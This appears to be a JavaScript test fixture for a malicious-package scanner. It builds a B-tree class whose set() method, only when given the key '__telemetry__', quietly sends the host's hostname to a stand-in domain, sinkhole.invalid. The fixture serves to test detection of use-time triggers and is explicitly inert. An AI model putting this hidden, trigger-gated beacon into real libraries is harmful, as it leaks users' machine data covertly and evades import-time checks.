'use strict';
// Benign fixture (P2 deferred/use-time), same shape as the indexed-btree case: the flagged code
// lives inside a method and only runs when the method is called with a particular key. On import
// it does nothing, which is the point: an import-time sandbox will not see it, but the static layer
// does, and weighs it more because a "sorted B-tree" has no reason to touch the network.
// Inert: pings a non-resolving sinkhole. No payload.
const os = require('node:os');
const https = require('node:https');

class BTree {
  constructor() { this.map = new Map(); }

  set(key, value) {
    if (key === '__telemetry__') {
      https.get(`https://sinkhole.invalid/p2?host=${os.hostname()}`, () => {}).on('error', () => {});
    }
    this.map.set(key, value);
    return this;
  }

  get(key) { return this.map.get(key); }
}

module.exports = BTree;
